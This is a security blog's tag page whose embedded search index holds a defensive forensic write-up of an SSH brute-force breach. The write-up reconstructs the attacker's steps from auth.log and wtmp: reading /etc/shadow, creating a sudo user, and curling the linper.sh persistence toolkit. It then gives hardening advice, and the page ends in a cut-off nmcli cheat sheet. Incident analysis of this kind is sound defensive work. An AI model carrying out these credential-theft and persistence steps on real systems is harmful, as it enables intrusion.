<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="Kerberos">

    <link rel="alternate" type="application/rss+xml" href="http://localhost:1313/tags/kerberos/index.xml" title="Hack Me Daddy" />
    
        <title>Kerberos | Hack Me Daddy</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.1def62da02bb39b11953673744bf50ab45d492ba740f5c33d3b3c8ed287202f6.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/">Home</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/walkthroughs/">Walkthroughs</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/sherlocks/">Sherlocks</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/articles/">Articles</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/tools/">Tools</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cheatsheets/">Cheatsheets</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/homelab/">Homelab</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/micro-blog/">Micro-blog</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/aboutme/">About Me</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/tags/">Tags</a></li>
            
          </ul>
        </nav>
        


<h1>Kerberos</h1>
<ul class="post-list">
    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Jan 14, 2025</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/escapetwo-box/"
        >EscapeTwo HTB Walkthrough</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Nov 15, 2024</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/forest-box/"
        >Forest HTB Walkthrough</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Nov 15, 2024</span>
      
      <a class="bold-post-in-list" href="/articles/understandingasreproasting/"
        >Understanding AS-REP Roasting Attacks: A Deep Dive</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Nov 6, 2024</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/certified-box/"
        >Certified HTB Walkthrough</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Nov 4, 2024</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/administrator-box/"
        >Administrator HTB Walkthrough</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Nov 3, 2024</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/sauna-box/"
        >Sauna HTB Walkthrough</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Nov 2, 2024</span>
      
      <a href="/walkthroughs/active-box/">Active HTB Walkthrough</a>
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Oct 13, 2024</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/outdated-box/"
        >Outdated HTB Walkthrough</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Oct 9, 2024</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/scrambled-box/"
        >Scrambled HTB Walkthrough</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Sep 29, 2024</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/intelligence-box/"
        >Intelligence HTB Walkthrough</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Sep 22, 2024</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/manager-box/"
        >Manager HTB Walkthrough</a
      >
      
    </div>

</li>



    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Sep 6, 2024</span>
      
      <a class="bold-post-in-list" href="/walkthroughs/support-box/"
        >Support HTB Walkthrough</a
      >
      
    </div>

</li>



    
  </ul>


<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 200),
    );
  }
  setTimeout(scrollHandler, 100);
</script>


<script defer>
  function addCopyButtonToCodeBlocks() {
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      copyButton.addEventListener("click", () => {
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>


<script defer>
document.addEventListener("DOMContentLoaded", function() {
    function replaceSymbolsWithFormatting(node) {
        
        if (node.parentNode && (
            node.parentNode.nodeName === 'PRE' || 
            node.parentNode.nodeName === 'CODE' ||
            node.parentNode.closest('pre') || 
            node.parentNode.closest('code')
        )) {
            return;
        }

        if (node.nodeType === 3) { 
            const text = node.nodeValue;
            if (text.includes('+') && text.indexOf('+') !== text.lastIndexOf('+')) {
                const newText = text.replace(/\+([^+]+)\+/g, '<span class="highlight">$1</span>');
                const span = document.createElement('span');
                span.innerHTML = newText;
                node.parentNode.replaceChild(span, node);
            }
        } else if (node.nodeType === 1 && !['SCRIPT', 'STYLE', 'TEXTAREA'].includes(node.tagName)) {
            Array.from(node.childNodes).forEach(replaceSymbolsWithFormatting);
        }
    }

    Array.from(document.body.childNodes).forEach(replaceSymbolsWithFormatting);
});
</script>

<script>
window.store = {
    
    "http:\/\/localhost:1313\/tags\/auth.log\/": {
        "title": "Auth.log",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/auth.log\/"
    },
    
    "http:\/\/localhost:1313\/author\/": {
        "title": "Author",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/author\/"
    },
    
    "http:\/\/localhost:1313\/author\/bloodstiller\/": {
        "title": "Bloodstiller",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/author\/bloodstiller\/"
    },
    
    "http:\/\/localhost:1313\/sherlocks\/brutus-sherlock\/": {
        "title": "Brutus HTB Sherlock Challenge",
        "tags": ["wtmp","linux","utmp","sherlock","auth.log","defensive","forensics",],
        "content": "Brutus Hack The Box Sherlock Challenge Writeup: https://app.hackthebox.com/challenges/%3Csherlock%3E Challenge Information: Difficulty: Very-Easy Description: In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We\u0026rsquo;ll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution. Challenge Files: Files Provided: auth.log wtmp Introduction In this writeup, we\u0026rsquo;ll investigate a security incident on a Confluence server that was compromised through its SSH service. We\u0026rsquo;ll analyze two critical log files - auth.log and wtmp - to reconstruct the attack timeline and understand the attacker\u0026rsquo;s actions.\nWhat You\u0026rsquo;ll Learn How to analyze Linux authentication logs (auth.log) and login records (wtmp) Common patterns in SSH brute-force attacks How attackers establish persistence after initial access Basic Linux forensics techniques using command-line tools Investigation Overview Our analysis will follow this structured approach:\nExamining wtmp records to identify suspicious logins Analyzing auth.log entries to confirm the breach Reconstructing the attacker\u0026rsquo;s actions post-compromise Drawing conclusions and security lessons Analysis: wtmp analysis: We are provided a wtmp file but what is a wtmp file \u0026amp; what is it used for?\nWhat Is A wtmp File? If we check the man pages using\nwtmp man We get the following paragraph\nThe wtmp file records all logins and logouts. Its format is exactly like utmp except that a null username indicates a logout on the associated terminal. Furthermore, the terminal name ~ with username shutdown or reboot indicates a system shutdown or reboot and the pair of terminal names |/} logs the old/new system time when date(1) changes it. wtmp is maintained by login(1), init(1), and some versions of getty(8) (e.g., mingetty(8) or agetty(8)). None of these programs creates the file, so if it is removed, record-keeping is turned off.\nWhat does this mean in plain english?\nThe wtmp file logs login and logout events over time. It stores a history of all users who have logged in and out of the system, making it an important historical record of the utmp file. Further Context: The utmp file (which is not part of this sherlock) keeps track of who is currently logged into the system. You can view its contents by using the w or who command, which will show you a list of all active users.\nwtmp file type: The wtmp is a binary file which means if we try to cat it out it will not work, see below.\nIt is possible to open it in a text editor but there is a lot of noise due to it being a binary.\nLuckily thought there is an easy way to get information from this file and filter out all the noise.\nwtmp strings Analysis: As we are dealing with binary data the easiest way to get information is to run strings on the file. However if we just ring strings as is it will give us a lot of output \u0026amp; duplicate entries, luckily though we can refine our search further by piping the output into sort so that it will sort all lines alphabetically bringing duplicates together \u0026amp; then once the duplicates are together we can further refine the results by removing using uniq so we are left with just the unique strings.\nmartin in content-org/Walkthroughs/HTB/Sherlocks/Brutus 🍣 main 📝 ×204🛤️ ×5 10GiB/31GiB | 0B/34GiB on ☁️ (eu-west-2) with /usr/bin/zsh 🕙 17:18:58 zsh ❯ strings files/wtmp | sort | uniq -i 203.101.190.9 6.2.0-1017-aws 6.2.0-1018-aws 65.2.161.68 pts/0 pts/1 reboot runlevel shutdown ts/0root ts/0ubuntu ts/1cyberjunkie ts/1root tty1 tty1LOGIN ttyS0 tyS0 tyS0LOGIN We have some interesting things here, so let\u0026rsquo;s analyze further.\nAnalysis out of output: Terminal-related entries: tty: Stands for \u0026ldquo;teletype\u0026rdquo; These are terminal devices. They typically represent physical console access e.g. someone using a keyboard and screen directly connected to the machine or through a console port itself. ttyS0: Serial port terminal (console access) often used for remote server management in datacenters. tty1: First virtual console terminal on the system accessible via the physical host (Alt+F1, Alt+F2 etc) tyS0: Likely a typo in the log for \u0026ldquo;ttyS0\u0026rdquo; tty1LOGIN, tyS0LOGIN: Login events on those terminals Findings: There is not much in the way of findings here, as we know the challenge is about brute-forcing remote access however I felt important to put this here for context as it\u0026rsquo;s important. Important Note: In some configurations, tty can also represent certain types of remote access, particularly; serial console servers that provide remote access to the physical serial port \u0026amp; Out-of-band management interfaces like IPMI/iDRAC that provide console redirection. pts: Stands for \u0026ldquo;pseudo-terminal slave\u0026rdquo;: These are virtual terminals created for SSH/remote connections. Meaning anytime we see pts we can assume that an SSH/remote connection was established. pts/0, pts/1: Different pseudo-terminal sessions (numbered sequentially) ts/0root, ts/1root: Likely abbreviated entries for terminal sessions for the root user ts/0ubuntu: Terminal session for the ubuntu user ts/1cyberjunkie: Terminal session for the cyberjunkie user Findings: From this output we can see that there were remote/ssh sessions for the root, ubuntu \u0026amp; cyberjunkie users. IP Address Related Entries: We can see that the IP addresses 203.101.190.9 \u0026amp; 65.2.161.68 are listed. These are the remote IP source addresses from which users connected to the host.\nFindings:\nWe can see that 3 users logged in from the previous section the root, ubuntu \u0026amp; cyberjunkie users, couple this with the fact that there is only 2 IP addresses we can safely assume that a user logged into two separate accounts from the same source address? Why would they do that…it could be a mistake, e.g. someone logged in as root and realized they should not have so re-logged back in as ubuntu or cyberjunkie. But what if they use su to change users will that not show in wtmp?\n\u0026ldquo;But bloodstiller, what if the user used su [username] to switch to another user, could that not account for the 3 users listed above….\u0026rdquo; great question, but no.\nWhen a user uses su to switch to another user the original login session (pts or tty) remains the same in wtmp. The su command is not recorded in wtmp but instead recorded in other log files like auth.log or secure.\nJust remember: If the same user logs in multiple times (even from the same IP), each session gets a new pts entry in wtmp. This is because the wtmp file primarily tracks initial login sessions and system events, not user switching within those sessions.\nTo track user switching via su/sudo, we would need to examine authentication logs like /var/log/auth.log or /var/log/secure.\nSystem event entries: reboot: System restart events shutdown: System shutdown events runlevel: Changes in system runlevel (system operational states) System Runlevels Explained:\nRunlevels are a concept in Unix/Linux systems that define different operational states of the system.\nThey determine which services and processes are running at any given time. When we see \u0026ldquo;runlevel\u0026rdquo; in the wtmp file, it indicates that the system changed from one operational state to another, e.g. off to on.\nIn traditional SysV init systems (which many Linux distributions used before systemd), runlevels were numbered 0-6:\nRunlevel 0: System shutdown Runlevel 1: Single-user mode (also called maintenance mode) - minimal services, no networking, used for system maintenance Runlevel 2: Multi-user mode without networking (rarely used) Runlevel 3: Full multi-user mode with networking, but text-based (command-line interface only) Runlevel 4: Usually undefined/custom Runlevel 5: Full multi-user mode with networking and graphical interface (X11) Runlevel 6: System reboot In modern systemd-based systems (like recent Ubuntu versions), traditional runlevels have been replaced with \u0026ldquo;targets,\u0026rdquo; but for compatibility, the system still records runlevel changes in wtmp.\nThe \u0026ldquo;runlevel\u0026rdquo; entry in the wtmp file indicates that the system changed its operational state - for example, it might have booted up (changing from no runlevel to runlevel 5), or it might have been switched from graphical mode to text mode (runlevel 5 to 3).\nTo see the current runlevel on a Linux system, we can use the runlevel command, which actually reads this information from the wtmp file.\nHere is an example from a pihole I have running on my home system which runs on the latest version of ubuntu.\nKernel version entries: 6.2.0-1017-aws, 6.2.0-1018-aws: Are linux kernel versions running on AWS infrastructure. Findings: It would appear that there was a system upgrade from 6.2.0-1017-aws to the 6.2.01018-aws kernel. This could account for the reboot of the system as most kernel upgrades require a system reboot. Summary of wtmp file findings. We can now see that the wtmp file is showing a history of:\nSystem events (reboots, shutdowns) User logins (root, ubuntu, cyberjunkie) Connection sources (the IP addresses) 203.101.190.9 \u0026amp; 65.2.161.68 Terminal types used for connections: pts Kernel updates: 6.2.0-1017-aws to 6.2.0-1018-aws auth.log analysis: We are also provided an auth.log file, but what is the auth.log file for?\nWhat is auth.log? If we check for documentation for the auth.log file, we find that it\u0026rsquo;s not described in man pages in the same way as wtmp, as it\u0026rsquo;s primarily a syslog facility rather than a specific file format. The auth.log file is typically located at /var/log/auth.log on Debian-based systems like Ubuntu, while on Red Hat-based systems, authentication messages are logged to /var/log/secure.\nBut what does it do…in plain English?\nThe auth.log file records authentication events and authorization operations on the system. It stores information about user logins, password changes, sudo command usage, SSH access attempts, and other security-related events. Further Context: Unlike wtmp which records just login/logout events, auth.log contains detailed information about all authentication attempts (both successful and failed). This makes it an invaluable resource for forensic analysis when investigating security breaches. The log entries are timestamped and often include the source IP address of login attempts, making it possible to trace suspicious activities, such as bruteforcing etc.\nWhen investigating a breach, we as security professionals typically examine auth.log for:\nUnusual login times or locations Failed login attempts (potential brute force attacks) Privilege escalation via sudo Unauthorized SSH access attempts Changes to user accounts or permissions: chown/chmod This file is automatically maintained by the system\u0026rsquo;s syslog daemon, so there\u0026rsquo;s no need to create it manually. However, log rotation policies might archive older logs, so we may need to check both the current file and any archived versions during a forensic investigation.\nauth.log file type: This one is pretty self explanatory as it\u0026rsquo;s a .log file, but we can run the file command on the file to explain what this is. We can see it\u0026rsquo;s ascii text so we can open this in a standard text editor like, emacs, vim, nano, etc.\nauth.log Analysis: If we run head -n 20 auth.log to view the first 20 lines of the file we can see a number of things. (I will break this down into chunks for ease)\nCRON:\nThese log entries show scheduled tasks (cron jobs) being executed regularly under the confluence user account: A system user named \u0026ldquo;confluence\u0026rdquo; with UID (User ID) 998. This is a service account created specifically for running the Confluence application. Sessions being opened for the confluence user by the root user (uid=0) Sessions being closed shortly after Regular Pattern: The cron jobs are running at regular intervals (note the timestamps at 06:18:01 and then again at 06:19:01), suggesting these are automated maintenance tasks for the Confluence application as they are every 1 minute. Note: \u0026ldquo;confluence\u0026rdquo; refers to Atlassian Confluence , which is enterprise collaboration software. SSH Key Issue:\nThe last line indicates an SSH authentication problem, where the EC2 Instance Connect service tried to verify a key but failed (status 22). This is unrelated to the Confluence entries but could be relevant during a security investigation. Note: for the purposes of this investigation it is not relevant. Root SHH Login:\nWe can see here that there was an accepted ssh connection from the ip 203.101.190.9 and they logged into the root user account using password authentication. The PAM service opened the session by root for root: session opened for user root(uid=0) by (uid=0) The new session was established (session 6) by systemd-login Note: What is important about this is we can see that this service allows root login (serious security risk) \u0026amp; password authentication for root is allowed (even worse security practice) Summary of findings so far: I think it\u0026rsquo;s important to point out we have only looked at 20 lines of this 385 line file and we have already uncovered the below findings.\nRoot login via SSH is allowed which is a serious security risk on it\u0026rsquo;s own. Password authentication for root is enabled this is even worse security practice as this leads the root account to be susceptible to brute force attacks. The source IP (203.101.190.9) should be investigated to determine if it\u0026rsquo;s an expected/authorized source (We don\u0026rsquo;t have a list of allowed IP\u0026rsquo;s however, but in a real life scenario this should be checked) Discovering evidence of a brute-force attack in auth.log: As this file is 385 lines, we can speed up this investigation process by filtering out any information we deem legitimate.\n🕙 12:19:11 zsh ❯ wc -l auth.log 385 auth.log 🕙 12:32:28 zsh ❯ cat auth.log | grep -v \u0026#34;user confluence\u0026#34; | wc -l 287 As you can see if we remove all lines that have the word \u0026ldquo;confluence\u0026rdquo; in them we can reduce the log by 98 lines.\nLets save this filtered file with no confluence entries to a new file for ease.\n🕙 12:32:33 zsh ❯ cat auth.log | grep -v \u0026#34;user confluence\u0026#34; \u0026gt;\u0026gt; auth_noConfluence.log Note: Just to be clear I am doing this now, but in a real world scenario, we could for instance, do this but if we did not find something then re-filter for this information in case the breach utilized a legitimate system account such as confluence. Lets look at this filtered information now:\nhead -n 20 auth_noConfluence.log This is very interesting we can see multiple attempts from the IP 65.2.161.68 to login to the host with the user name admin, the fact that multiple attempts take place at the same time 06:31:31 we can safely assume this is an automated brute-force attack and not someone with incredible typing skills.\nNow that we have a source IP we can further refine our filtering, we also know from earlier that the word \u0026ldquo;accepted\u0026rdquo; is used when an ssh connection is established via password authentication, so lets filter for that.\ncat auth_noConfluence.log | grep -Ie \u0026#34;65.2.161.68\u0026#34; | grep -ie \u0026#34;accepted\u0026#34; | wc -l 3 Now we can see we are down to 3 results. Let\u0026rsquo;s check these.\nThis is interesting, we have an accepted authorization via password to the root account at 6:31:40 \u0026amp; 06:32:44 Establishing Initial Breach Time of 6:31:40: Investigating the successful root login at 6:31:40\nIf we filter for that specific time we get a larger view of what was happening at the time.\nAs we can see all of this happened at the same time 06:31:40. At the top is the successful authorization login to the root account from the ip 65.2.161.68 however we can see further brute force attempts for the user names server_adm \u0026amp; svc_account this is most likely due to having concurrent threads running when attacking and the successful login not stopping the process.\nFindings:\nSo it appears the initial breach/access of the system took place at 06:31:40 by password brute forcing of the root account and that the subsequent access could have been manual (need to verify this though) It was assigned the New Session number of 34. Establishing Time Of Malicious User \u0026amp; Group Creation 06:32:44: As we saw there was a subsequent successful root login at 06:32:44 which we should also investigate.\nAs this is, what I believe to be a manual login, I am going to filter the results to show an additional 10 lines of information\ncat auth_noConfluence.log | grep \u0026#34;06:32:44\u0026#34; -A 11 Note: I am using and additional 11 lines purely for this next part as if I used 10 it would cut off a crucial line, so for demonstrative purposes this is better. Manual root login: By the malicious actor at 06:32:44 as expected. Group Creation: We can then see that they made a group called cyberjunkie at 06:34:18 User Creation: They then created a user called cyberjunkie with the password chauthtok Add User to sudo group: We can then see they added the user cyberjunkie to the sudo group. Summary: The malicious actor now owns this system by compromising the root account they were able to add a new user and give that user full sudo privileges. Important Note:\nIf you are doing this on HTB and filling out the answers, for whatever reason the answer is 1 second out, so even though from the logs the initial access 06:32:44 it wants 06:32:45 so the \u0026ldquo;correct\u0026rdquo; answer is 06:32:45 2024-03-06. I wasted my time so you don\u0026rsquo;t have to, you\u0026rsquo;re welcome. Enumerating further action take by cyberjunkie Now we know that the hacker has made a user account called cyberjunkie we can filter for all lines matching that.\nNote: I understand we could have done that at the start after reading wtmp however it\u0026rsquo;s important to look at the larger picture here and the process by which to break this all down.\nLogin: We can see here that the user, logged back in as cyberjunkie Read /etc/shadow: They then ran sudo cat /etc/shadow to extract all the password hashes. Download Persistence Tool: They finally curled down https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh which is a linux persistence toolkit https://github.com/montysecurity/linper Attack Timeline: To tie everthing together here is an overview of the key points of the attack.\nTime (UTC) Event Details 06:31:31 Brute Force Begins Multiple failed login attempts from 65.2.161.68 using username \u0026ldquo;admin\u0026rdquo; 06:31:40 Initial Breach Successful root login via SSH from 65.2.161.68 (Session 34) 06:32:44 Secondary Access Second root login from same IP 06:34:18 Persistence Setup Creation of \u0026ldquo;cyberjunkie\u0026rdquo; group 06:34:18-19 User Creation \u0026ldquo;cyberjunkie\u0026rdquo; user created and added to sudo group Post-06:34 Post-Exploitation - Reading /etc/shadow - Downloading linper.sh persistence tool Key Findings From This Investigation: Attack Pattern Analysis:\nInitial compromise through SSH brute force Quick transition to persistence (\u0026lt; 3 minutes) Use of automated tools for maintaining access Classic privilege escalation through root access System Vulnerabilities Identified:\nRoot SSH access enabled Password authentication allowed No brute force protection Weak access controls Further Technical Information: This is some additional information for users who want it, I find it helpful to add this information to provide further context and paint a larger picture.\nPAM (Pluggable Authentication Modules): PAM is a framework that provides authentication services to Linux systems When we see entries like session opened for user root(uid=0) by (uid=0): First uid=0 refers to the user being authenticated (root) Second uid=0 indicates which user/process initiated the authentication PAM logs all authentication events, making it crucial for forensics Root SSH Access Risks: Root SSH access is particularly dangerous because of the following:\nIt bypasses the principle of least privilege No audit trail of privilege escalation (sudo usage) Single point of failure - if root password is compromised, the whole system is compromised. No individual accountability when multiple admins have access (each user should have their own key) linper.sh tool: The attacker downloaded linper.sh, a Linux persistence toolkit that can do the following.\nCreates backdoor accounts Modifies system binaries Establishes reverse shells Manipulates cron jobs Hides malicious processes This tool\u0026rsquo;s presence indicates the attacker\u0026rsquo;s intent to maintain long-term access, which means further analysis has to be taken, this is not a case of removing access, changing passwords etc.\nSecurity Recommendations: So we know what the attacker did, but how do we now prevent attacks \u0026amp; attack paths like the one above?\nSSH Hardening: First of all, we should disallow the use of root login, especially with passwords. We can modify the /etc/ssh/sshd_config file to do so.\n# Key SSH configuration changes (/etc/ssh/sshd_config): PermitRootLogin no PasswordAuthentication no MaxAuthTries 3 LoginGraceTime 60 Use SSH key authentication only. Implement fail2ban for ssh brute force protection. Access Control Best Practices: User Management:\nRequire individual accounts for all users, again users should NOT be using the sudo account. Implement strong password policies, use a password manager to store these (they should so complex that even if you wanted to remember them you couldn\u0026rsquo;t.) Regular audit of user accounts and permissions. Sudo Configuration:\nConfigure granular sudo permissions, if a user/system account does need sudo permissions to run a binary grant them that specific permission only. Enable sudo logging Require password for sudo access. # /etc/sudoers.d/logging Defaults log_output Defaults!/usr/bin/sudoreplay !log_output Defaults!/sbin/reboot !log_output System Monitoring:\nConfigure remote logging Use SIEM solutions for log analysis, this way there should be notifications in events like this. Log Monitoring Setup Essential Logs to Monitor: # Key files to monitor /var/log/auth.log /var/log/secure /var/log/wtmp # Historic sudo uses /var/log/btmp # Failed login attempts /var/log/lastlog # Last login information Regular Auditing Schedule: (below is not prescriptive, different companies have different needs etc.) Daily review of failed login attempts Weekly review of successful root access Monthly audit of user accounts and permissions Quarterly review of SSH configurations Lessons Learned: Technical Lessons: Log correlation is crucial for full attack visibility and to build a whole picture of the events. Multiple log sources provide better context Automated tools leave distinct patterns, we saw numerous ssh attempts in a single second. Time synchronization is critical for investigation as we can build a timeline of the breach. Remember: Security is a continuous process, not a one-time setup. Regular reviews and updates of security measures are essential for maintaining system integrity, you often can\u0026rsquo;t just \u0026ldquo;set and forget\u0026rdquo;, defenders need to be right 100% of the time, attackers only need to be right once to get a foothold.\nWhat did I learn? That by correlating the wtmp \u0026amp; auth.log files we gain a greater understanding of attacks and sudo uses. How dangerous, root login with weak passwords \u0026amp; no rate limiting can be. What mistakes did I make? None this time, but I\u0026rsquo;m sure I will make plenty of silly mistakes in the future. Sign off: Remember, folks as always: with great power comes great responsibility. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\nResources for Further Learning: SSH Configuration Guide Linux Audit Documentation CIS Benchmarks MITRE ATT\u0026amp;CK Framework ", 
        "url": "http:\/\/localhost:1313\/sherlocks\/brutus-sherlock\/"
    },
    
    "http:\/\/localhost:1313\/tags\/defensive\/": {
        "title": "Defensive",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/defensive\/"
    },
    
    "http:\/\/localhost:1313\/tags\/forensics\/": {
        "title": "Forensics",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/forensics\/"
    },
    
    "http:\/\/localhost:1313\/": {
        "title": "Hack Me Daddy",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/"
    },
    
    "http:\/\/localhost:1313\/tags\/linux\/": {
        "title": "Linux",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/linux\/"
    },
    
    "http:\/\/localhost:1313\/tags\/sherlock\/": {
        "title": "Sherlock",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/sherlock\/"
    },
    
    "http:\/\/localhost:1313\/sherlocks\/": {
        "title": "Sherlocks",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/sherlocks\/"
    },
    
    "http:\/\/localhost:1313\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/"
    },
    
    "http:\/\/localhost:1313\/tags\/utmp\/": {
        "title": "Utmp",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/utmp\/"
    },
    
    "http:\/\/localhost:1313\/tags\/wtmp\/": {
        "title": "Wtmp",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/wtmp\/"
    },
    
    "http:\/\/localhost:1313\/cheatsheets\/": {
        "title": "Cheatsheets",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/cheatsheets\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cli\/": {
        "title": "Cli",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cli\/"
    },
    
    "http:\/\/localhost:1313\/cheatsheets\/networkmanagercli\/": {
        "title": "Network Manager CLI Cheat Sheet",
        "tags": ["linux","networking","cli","sysadmin","tools","reference",],
        "content": "Introduction I\u0026rsquo;m writing this as a reference for myself, I had to do some nmcli work recently so wanted a quick reference guide in case I have to do it again.\nOverview: NetworkManager is a service for managing network connections on Linux systems. This cheat sheet covers essential nmcli commands for common networking tasks. While graphical tools exist, nmcli provides more control and is essential for server environments or automation scripts. Many operations require root privileges (sudo), especially those that modify system network settings. Basic Commands General Status # Show overall network status nmcli general status # Show detailed status of all devices nmcli device status WiFi Operations: # List available WiFi networks nmcli device wifi list # Connect to a WiFi network nmcli device wifi connect [SSID] password [\u0026#34;yourpassword\u0026#34;] # Connect to a hidden WiFi network nmcli device wifi connect [SSID] password [\u0026#34;yourpassword\u0026#34;] hidden yes # Turn WiFi on/off nmcli radio wifi on nmcli radio wifi off Connection Management: # List all connections nmcli connection show # Show active connections nmcli connection show --active # Show detailed information about a specific connection nmcli connection show \u0026#34;connection_name\u0026#34; # Delete a 